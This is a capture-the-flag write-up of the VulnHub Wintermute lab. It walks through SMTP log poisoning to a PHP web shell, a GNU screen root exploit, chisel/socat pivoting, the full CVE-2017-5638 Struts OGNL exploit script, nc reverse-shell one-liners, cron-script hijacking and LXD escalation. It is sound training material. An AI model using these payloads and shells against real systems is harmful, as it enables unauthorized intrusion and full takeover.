---
layout: post
title: VulnHub Wintermute Writeup
categories: VulnHub Machines
permalink: /vulnhub/wintermute
---

Machine: [https://www.vulnhub.com/entry/wintermute-1,239/](https://www.vulnhub.com/entry/wintermute-1,239/)
Machine Author: [creosote](https://www.vulnhub.com/author/creosote,584/)

This is a lab that deals with two VMs

## Network Topology

![Wintermute](https://github.com/user-attachments/assets/838ceb13-46c0-4bb0-a5e1-38b1bd8f5fce)


## Nmap

```bash
# Nmap 7.94SVN scan initiated Mon Jan 13 05:21:05 2025 as: /usr/lib/nmap/nmap -Pn -p- -A --min-rate 5000 -oN scan.txt 192.168.56.102
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.102
Host is up (0.00072s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE            VERSION
25/tcp   open  smtp               Postfix smtpd
| ssl-cert: Subject: commonName=straylight
| Subject Alternative Name: DNS:straylight
| Not valid before: 2018-05-12T18:08:02
|_Not valid after:  2028-05-09T18:08:02
|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
80/tcp   open  http               Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Night City
3000/tcp open  hadoop-tasktracker Apache Hadoop
|_http-trane-info: Problem with XML parsing of /evox/about
| hadoop-datanode-info: 
|_  Logs: submit
| http-title: Welcome to ntopng
|_Requested resource was /lua/login.lua?referer=/
| hadoop-tasktracker-info: 
|_  Logs: submit
MAC Address: 08:00:27:82:72:4F (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host:  straylight

TRACEROUTE
HOP RTT     ADDRESS
1   0.72 ms 192.168.56.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 13 05:21:17 2025 -- 1 IP address (1 host up) scanned in 12.52 seconds

```

We can see that there are not many ports open on the server. There is not even an ssh server open which tells us that our main entry point into the system will be a web shell. Let’s breakdown these ports.

- Port 25 - SMTP: This is a service used to send mails. There is not much we can do with this service except run user enumeration. We can utilize this later if we find a valid password somehow.
- Port 80 - HTTP: This is a web server, we should enumerate this to see if we can find a way to upload a webshell.
- Port 3000 - ntop: We can see that ntopng is running on this port, which is a network monitoring solution. We can use this to find more information about the type of information flowing in the network.

Let’s start enumerating with the HTTP port to see what we can find.

## HTTP

![1](https://github.com/user-attachments/assets/c6d859d7-175a-402e-8a2a-d9848390118e)


We are greeted with this message setting up the theme of the box. There is nothing much in the source code, and there is no robots.txt file either. So it seem we need to perform some directory busting.

```bash
feroxbuster -u http://192.168.56.102 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x txt,zip,php,sh -n -C 404
                                                                                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.102
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, zip, php, sh]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       11l       13w      193c http://192.168.56.102/xwx.html
200      GET      272l     1132w     8667c http://192.168.56.102/gl.css
200      GET       17l       23w      326c http://192.168.56.102/
301      GET        9l       28w      317c http://192.168.56.102/manual => http://192.168.56.102/manual/
301      GET        9l       28w      319c http://192.168.56.102/freeside => http://192.168.56.102/freeside/
[####################] - 2m   1102745/1102745 0s      found:5       errors:1      
[####################] - 2m   1102725/1102725 9838/s  http://192.168.56.102/
```

We are able to find a /freeside page.

![2](https://github.com/user-attachments/assets/6431f27c-3f2c-4ac4-b0b2-36bfc287df51)


There isn’t much here to find though. There was nothing in the source code either. There was a .jpg file there, so I tried to run stegseek on it but that didn’t really pan out. There wasn’t much of anything else to do here so we can go ahead and check out ntopng.

## NTOPNG

![3](https://github.com/user-attachments/assets/d395b2d4-0cab-4560-ae02-fb9d484ff1ea)


We are greeted with this page. We have the credentials there so let’s go ahead and login.

![4](https://github.com/user-attachments/assets/299768bf-0b2d-42fe-9452-f3180876338d)


We are greeted with this page. Now, time to look around and see what we can find. There aren’t any exploits for this version of ntop, so we will have to look for information disclosure.

![5](https://github.com/user-attachments/assets/ae255c0a-74aa-45dd-b311-01f761ccc944)


We are able to find this page which shows connection information. We can see a connection information to the /freeside page we found earlier. In addition to that there is also a /turing-bolo page that we were not able to find with feroxbuster.

Let’s go ahead and visit it to see what we can find.

![6](https://github.com/user-attachments/assets/f29cb23d-5bcd-4f54-816f-a639ec7259f9)


We can see a list of people.

![7](https://github.com/user-attachments/assets/dfee20dc-b872-4cd2-a15c-680ced94c85e)


We can note this down for later in case they are valid users. For now let’s go ahead and click submit query to see where it takes us.

![8](https://github.com/user-attachments/assets/036d9d1b-dfdf-4f77-aaa8-20c3099042ab)


We can see this page with a GET parameter bolo=case. I tried it for LFI to see if we could view other files, but that didn’t work. So I decided to try out one of the other persons in the list.

![9](https://github.com/user-attachments/assets/e5216797-7542-4a24-adc6-e031b93b03c4)


The only thing that changed was the bolo parameter to bolo=molly. The other pages were similar with only the bolo parameter changing to the names in the list. I then decided to look at the information carefully. Then I found something interesting in the case page.

![10](https://github.com/user-attachments/assets/e9f4078b-3fc5-4ab9-b26f-5198ac831dbb)


We can see other members’ names here and they end with .log. We can deduce from this that the parameter we pass to the bolo is appended with .log and the file contents are displayed. To test this out I tried to visit http://192.168.56.102/turing-bolo/bolo.php?bolo=../turing-bolo/molly to see if it would take me to molly’s page and it did.

![11](https://github.com/user-attachments/assets/f82bc5a8-964e-4e4d-92dc-8a02a64acd8b)


From this we know that we have limited LFI. The query appends a .log to whatever argument we send to the bolo parameter. I tried to see if we needed relative referencing (../../) to read a file or if absolute paths worked, just as a way to the attack more efficient. I tried this using the url http://192.168.56.102/turing-bolo/bolo.php?bolo=/var/www/html/turing-bolo/molly.

![12](https://github.com/user-attachments/assets/35630d7c-9bc0-48ac-a1bd-cf46f866d2c3)


That worked out and turns out we can use absolute paths and it loads the file.

I tried to use various techniques to make the .log be skipped, but none of them worked out. So I thought, if we can read some access logs or error logs we might be able to perform log poisoning.

I tried reading common log files to see if I could read anything, I got a hit at /var/log/mail.log

![13](https://github.com/user-attachments/assets/671b9ed9-a914-4250-a3d0-77691d3f1f3d)


Since we can view the mail.log file, all we need to get a web shell is by somehow making our php code end up over here. After looking at what is added to the mail.log I figured out my attack.

```bash
telnet 192.168.56.102 25
Trying 192.168.56.102...
Connected to 192.168.56.102.
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
HELO choom
250 straylight
MAIL FROM:<choom@cyberpunk.com>
250 2.1.0 Ok
RCPT TO:<?php passthru($_GET['cmd']); ?>
501 5.1.3 Bad recipient address syntax
```

Let’s break down this attack.

What we did here is we sent our php code in the RCPT TO field with the incorrect syntax which will cause it to be logged in the mail.log file, which will run our php code.

Let’s go ahead and test it out

![14](https://github.com/user-attachments/assets/fce0b667-3434-4d59-98c7-af98159a73cd)


There we go, we now have a web shell. Let’s use this to get a reverse shell on the system.

```bash
nc -lvnp 4242         
listening on [any] 4242 ...
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.102] 50738
bash: cannot set terminal process group (579): Inappropriate ioctl for device
bash: no job control in this shell
www-data@straylight:/var/www/html/turing-bolo$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@straylight:/var/www/html/turing-bolo$
```

There we go we now have a shell as www-data. Let’s start by upgrading our shell to a more interactive one.

```bash
www-data@straylight:/var/www/html/turing-bolo$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<olo$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@straylight:/var/www/html/turing-bolo$ ^Z
zsh: suspended  nc -lvnp 4242
                                                                                                                                                                                                                                           
stty raw -echo; fg                                              
[1]  + continued  nc -lvnp 4242

www-data@straylight:/var/www/html/turing-bolo$ 
www-data@straylight:/var/www/html/turing-bolo$ 
```

There we go, now that we have a more interactive shell, we can go ahead and do some privilege escalation.

## Priv Esc

I started off by looking for credentials in the web root, which didn’t pan out. Then I moved to my next step which is to find binaries with their SUID bit set

```bash
www-data@straylight:/var/www$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/umount
/bin/mount
/bin/screen-4.5.0
/bin/ping
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
```

Every file was standard for SUID bit being set, but there was one file that stood out, screen-4.5.0. After a quick Google search I found an exploit.

https://www.exploit-db.com/exploits/41154

```bash
www-data@straylight:/tmp$ ./escalate.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
<SNIP>
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

# whoami
root
```

Finally we get root on the system.

But wait, there is still another machine to root, Neuromancer. 

So time for Round 2, but first let’s see what is in the /root folder

```bash
root@straylight:/etc# cd /root
root@straylight:/root# ls
flag.txt  note.txt  scripts
root@straylight:/root# cat flag.txt 
5ed185fd75a8d6a7056c96a436c6d8aa
root@straylight:/root# cat note.txt 
Devs,

Lady 3Jane has asked us to create a custom java app on Neuromancer's primary server to help her interact w/ the AI via a web-based GUI.

The engineering team couldn't strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can do.

Anyways, we've deployed the war file on tomcat as ordered - located here:

/struts2_2.3.15.1-showcase

It's ready for the devs to customize to her liking...I'm stating the obvious, but make sure to secure this thing.

Regards,

Bob Laugh
Turing Systems Engineer II
Freeside//Straylight//Ops5
```

We get our flag and there is a note, which gives us information about a java app running on Neuromancer under /struts2_2.3.15.1-showcase on Tomcat.

But we don’t know what Neuromancer’s IP address is. How do we find that? We can start off by finding the IP range of the interface connected to the same network as Neuromancer. We can do that by simply using the ip command.

```bash
root@straylight:/root# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:82:72:4f brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.102/24 brd 192.168.56.255 scope global enp0s3
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe82:724f/64 scope link 
       valid_lft forever preferred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:9b:a8:79 brd ff:ff:ff:ff:ff:ff
    inet 192.168.157.5/24 brd 192.168.157.255 scope global enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80::a00:27ff:fe9b:a879/64 scope link 
       valid_lft forever preferred_lft forever

```

We can see 3 interfaces, lo, enp0s3, and enp0s8. lo is simply our loopback address, enp0s3 is the network connected with our attack host, enp0s8 seems to be the one connected to the Neuromancer network.

So let’s go ahead and do a ping sweep to see what IP gives us a reply.

```bash
root@straylight:/root# for i in {1..254} ;do (ping -c 1 192.168.157.$i | grep "bytes from" &) ;done
64 bytes from 192.168.157.5: icmp_seq=1 ttl=64 time=0.011 ms
64 bytes from 192.168.157.6: icmp_seq=1 ttl=64 time=0.763 ms
64 bytes from 192.168.157.2: icmp_seq=1 ttl=255 time=0.316 ms
```

We get replies from three hosts. 

- 192.168.157.5 is our straylight machine.
- 192.168.157.2 is the Virtualbox DHCP server
- 192.168.157.6 should be the Neuromancer machine since that is the only one left.

So let’s go ahead and confirm this by sending a curl request to the Tomcat application running on Neuromancer.

```bash
root@straylight:/root# curl http://192.168.157.6:8080
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Apache Tomcat/9.0.0.M26</title>
        <link href="favicon.ico" rel="icon" type="image/x-icon" />
        <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
        <link href="tomcat.css" rel="stylesheet" type="text/css" />
    </head>
    <SNIP>
</html>

```

There we go we can see that Tomcat is up and running on the IP 192.168.157.6. Now it’s time to enumerate it.

Enumerating it directly from the straylight machine would be difficult since we don’t have our tools on the machine, and it wouldn’t be practical to move our tools to the machine, we need to utilize pivoting software. So let’s go ahead and do just that.

## Pivoting

We will use a software called chisel to set up a pivot. I would normally use ssh to perform a pivot since it’s more convenient but since ssh is not set up on the machine, we need to use chisel.

We will start of by adding this line to the /etc/proxychains.conf file.

```bash
socks5  127.0.0.1 1080
```

We will then start our chisel reverse server on our attack host

```bash
sudo ./chisel server -p 443 --reverse
2025/01/13 07:00:21 server: Reverse tunnelling enabled
2025/01/13 07:00:21 server: Fingerprint Y7gThrfiUphgV+JjGNtDf77fj/T6KVsMOPedzwuIFtY=
2025/01/13 07:00:21 server: Listening on http://0.0.0.0:443
```

We will then start our chisel client on our pivot host (straylight)

```bash
root@straylight:/tmp# ./chisel client 192.168.56.103:443 R:socks
2025/01/12 23:02:50 client: Connecting to ws://192.168.56.103:443
2025/01/12 23:02:50 client: Connected (Latency 712.928µs)
```

As we can see we are now connected. Let’s confirm this by connecting to the Tomcat application from our attack host. We will start by opening firefox using the proxychains command. This will cause all of our traffic from the resulting firefox window to go through our chisel proxy.

```bash
proxychains firefox
```

![15](https://github.com/user-attachments/assets/c55f1b4b-a0a3-4f6b-9ca5-6ebbb14be895)


There we go, we were able to successfully connect to the web server on the other network through our pivot host.

Let us now begin the enumeration.

I tried running the Metasploit tomcat_mgr_login module to bruteforce defualt tomcat credentials, but that didn’t pan out. 

Not to worry, we were given an endpoint to visit in the note we found on the /root in the straylight machine. So let’s go ahead and visit it.

![16](https://github.com/user-attachments/assets/11d584e8-9907-48f2-af66-b11d5a95ef7a)


We are greeted with this page, this is running strus2showcase, which is a framework for creating java web applications. Let’s see what we can enumerate from this.

After enumerating the website I didn’t really find anything interesting. So I decided to do a quick Google search to see if there were any exploits available. Turns out there were exploits for RCE. So I picked one from https://github.com/nixawk/labs/blob/master/CVE-2017-5638/exploit-requests.py

Although I had to modify it a bit for our purposes. I tried running the exploit through our chisel proxy but that was causing some problems. Since the exploit was an RCE, I decided to just run the exploit from the straylight machine and then just tunnel the reverse shell gained from the RCE.

```bash
#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Author : Nixawk

import requests
import string
import random
import logging

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

class CVE_2017_5638(object):

    # Apache Struts Jakarta Multipart Parser OGNL Injection

    def randomstr(self, length):
        '''generate a random string'''
        return ''.join(
            random.choice(string.ascii_uppercase + string.digits)
            for _ in range(length)
        )

    def exploit(self, url, cmd):
        '''execute cmd on remote target'''
        if self.check(url):

            ognl = ""
            ognl += "(#cmd='%s')." % cmd
            ognl += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
            ognl += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
            ognl += "(#p=new java.lang.ProcessBuilder(#cmds))."
            ognl += "(#p.redirectErrorStream(true)).(#process=#p.start())."
            ognl += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
            ognl += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
            ognl += "(#ros.flush())"

            http = self.send_struts_request(url, ognl)
            if http:
                print("[*] struts2-cmd $ %s\n" % cmd)
                print("[*] %s\n" % http.text)

    def check(self, url):
        '''test if target is vulnable'''
        var_a = self.randomstr(4)

        ognl = ""
        ognl += "(#os=@java.lang.System@getProperty('os.name'))."
        ognl += "(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('%s', #os))" % var_a

        http = self.send_struts_request(url, ognl)

        bret = http and (var_a in http.headers)
        if bret:
            print("[+] The target is vulnerable.")
        else:
            print("[?] The target is unknown, please check it manually")

        return bret

    def send_struts_request(self, url, ognl):
        '''send request(s) with struts payload'''
        payload = ""
        payload += "%{"
        payload += "(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))."
        payload += ognl
        payload += "}"

        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Content-Type': payload
        }

        http = None
        try:
            http = requests.get(
                url, headers=headers
            )
        except Exception as err:
            log.exception(err)

        return http

if __name__ == '__main__':
    import sys

    if len(sys.argv) != 3:
        print("[+] python %s <url> <cmd>" % sys.argv[0])
        sys.exit()

    url = sys.argv[1]
    cmd = sys.argv[2]
    st = CVE_2017_5638()
    st.exploit(url, cmd)
```

This is the final exploit I used. I only modified it to work with python3 and the libraries that were already on the straylight machine.

Since we have an exploit, all we need to do now is set up our tunnel. We can use socat to do this.

```bash
root@straylight:/tmp# socat TCP4-LISTEN:8088,fork TCP4:192.168.56.103:4246&
[1] 12558
```

This will cause any connection coming in to the 8088 port of the straylight machine to be tunelled to our attack host through port 4246 which is where our listener will be.

Let’s set up our listener and run our exploit.

```bash
root@straylight:/tmp# ./exploit.py http://192.168.157.6:8080/struts2_2.3.15.1-showcase/showcase.action 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.157.5 8088 >/tmp/f'
[+] The target is vulnerable.
```

```bash
nc -lvnp 4246         
listening on [any] 4246 ...
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.102] 43814
bash: cannot set terminal process group (1009): Inappropriate ioctl for device
bash: no job control in this shell
ta@neuromancer:/$ id
id
uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
ta@neuromancer:/$
```

There we go, we now have a shell as the user ta on the Neuromancer host from our Attack Host. I can even see a potential priv esc to root already, the lxd group. Let’s keep that in mind for later. Now it’s time to privilege escalate. 

Looking around the ta user’s home directory I found an interesting file. It shows a list of applications running on Neuromancer and their install locations.

```bash
ta@neuromancer:~$ cat ai-gui-guide.txt 
Application for Neuromancer remote access interface includes:

-Maven    - /opt/
-Java jdk - /usr/lib/jvm/
-Tomcat   - /usr/local/tomcat/
-Struts2  - /home/ta/myWebApp/
          - war files are in /root. Update these ASAP to improve security.

Reduce installation of apps to ONLY what's needed, seucure configurations and follow app security best practices.
```

We can see that tomcat is installed under /usr/local/tomcat/. We can go ahead and see if we can access the config file for tomcat to see if we can get some credentials.

```bash
ta@neuromancer:/usr/local/tomcat/conf$ cat tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
Eng.,

Tomcat is still using basic auth. I encoded the password so the AI's security scans don't flag it.

Is this what Bob keeps talking about, "Security by obscurity?"

Ed Occam//Sys.Engineer I//Night City
"Harry, I took care of it" - Llyod Christmas
-->

  <role rolename="manager-gui"/>
  <user username="Lady3Jane" password="&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;" roles="manager-gui"/>

<!--
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
</tomcat-users>
```

It seems we are able to read the config file. We can also see a note there stating that Ed Occam has encoded the password so the AI don’t flag it, but since it’s just encoding we can just decode it. We can see the username Lady3Jane who is also another user on the Neuromance machine alongside the ta user. Let’s go ahead and decode the password. 

The password was encoded as an HTML Entity. Decoding gives us the password

```bash
>!Xx3JanexX!<
```

Let’s try using this password to switch over to Lady3Jane’s account.

```bash
ta@neuromancer:~$ su lady3jane
Password: 
lady3jane@neuromancer:/home/ta$ id
uid=1001(lady3jane) gid=1001(lady3jane) groups=1001(lady3jane)
lady3jane@neuromancer:/home/ta$
```

There we go, we are able to log in to lady3jane’s account. Let’s perform some enumeration to see what we can do. We are able to find an interesting file in lady3jane’s home directory

```bash
lady3jane@neuromancer:~$ cat custom-tomcat-chk.sh 
#!/bin/bash
# Health check for Neuromancer (root) to execute every 3 minutes.
# ..the AI tells me it can maintain security, server health, etc w/o forced intervention,
# but I beg to differ...hence the cron script.

> /tmp/tomcat_status.log

health=$(curl -m 5 -Is 127.0.0.1:8080 |grep HTTP/1.1)

case "$health" in

  *200*)
        echo "Tomcat is Up" > /tmp/tomcat_status.log
        ;;
  *)
        echo "Tomcat is down" > /tmp/tomcat_status.log
        ;;
  esac
```

The comment says that root executes this script every 3 minutes. Lucky for us since the file is owned by lady3jane, all we need to do now is add a malicious command in the file and we will get root. Since we want to send a reverse shell we will need to setup another tunnel using socat. Let’s go back to straylight and do just that.

```bash
root@straylight:/tmp# socat TCP4-LISTEN:8089,fork TCP4:192.168.56.103:4247&
[2] 13372
```

There we go now we can just add our malicious code into the script and wait for a shell

```bash
lady3jane@neuromancer:~$ cat custom-tomcat-chk.sh 
#!/bin/bash
# Health check for Neuromancer (root) to execute every 3 minutes.
# ..the AI tells me it can maintain security, server health, etc w/o forced intervention,
# but I beg to differ...hence the cron script.

> /tmp/tomcat_status.log

health=$(curl -m 5 -Is 127.0.0.1:8080 |grep HTTP/1.1)

case "$health" in

  *200*)
        echo "Tomcat is Up" > /tmp/tomcat_status.log
        ;;
  *)
        echo "Tomcat is down" > /tmp/tomcat_status.log
        ;;
  esac
rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/bash -i 2>&1|nc 192.168.157.5 8089 >/tmp/g
```

After waiting a while for the reverse connection, I didn’t get a shell back. I thought the issue was with the socat tunnel, so I tried getting a reverse shell on the straylight machine, but that didn’t work either, so it seems the script is not actually being run.

After looking around, I didn’t really find anything else. So I tried to run linpeas, which didn’t really give me any interesting information. So I thought of running pspy to see if maybe there was another cronjob being run by root, which panned out.

```bash
2025/01/13 02:36:01 CMD: UID=0     PID=22789  | /bin/bash /home/lady3jane/server-check.sh
```

We can see that there is a process called by root, to /home/lady3jane/server-check.sh. So it seems that the script is named differently. Maybe this was a mistake on the author’s part or maybe they put that there to confuse us.

Anyways, now that we know that root is running /home/lady3jane/server-check.sh, we can go ahead and create that file with our malicious command.

```bash
lady3jane@neuromancer:~$ cat server-check.sh 
#!/bin/bash
rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/bash -i 2>&1|nc 192.168.157.5 8089 >/tmp/g
```

Now let’s set up our listener and wait for the shell

```bash
nc -lvnp 4247
listening on [any] 4247 ...
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.102] 43674
bash: cannot set terminal process group (22835): Inappropriate ioctl for device
bash: no job control in this shell
root@neuromancer:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@neuromancer:~# ls 
ls
flag.txt
struts2
velocity.log
root@neuromancer:~# cat flag.txt
cat flag.txt
be3306f431dae5ebc93eebb291f4914a
root@neuromancer:~#
```

There we go, we now have root successfully. There was still one thought lingering in my mind. The lxd group that the ta user was a part of. I wanted to see if that was a valid way to get root. So I did go ahead and try it

## Alternate Priv Esc to Root

Looking back at the ta user’s groups, we can see that it is part of the lxd group, which can be used to priv esc to root. Let’s go ahead and do just that.

You can check out the details here https://www.hackingarticles.in/lxd-privilege-escalation/ , I will just run the attack here.

What we need to do is build the alpine linux image, and send the tar file over to the victim, and initialize it using lxc. So let’s go ahead and do that.

I have already transferred the alpine image tar file to the neuromancer machine.

```bash
ta@neuromancer:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
ta@neuromancer:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Jan 13, 2025 at 9:10am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
ta@neuromancer:/tmp$ lxc init myimage ignite -c security.privileged=true
Creating ignite
ta@neuromancer:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
ta@neuromancer:/tmp$ lxc start ignite
ta@neuromancer:/tmp$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)

```

There we go we do get root although it's still a limited root. We can add an ssh key for the root user and then ssh into root to get full root.

## Final Thoughts

This was an amazing box. Boxes? It was definitely something different since it involved two hosts. The added difficulty from pivoting made this box interesting since it meant I had to modify certain exploits to match the pivoting aspect. I also learnt new attacks from this box such as the SMPT Log poisoning.
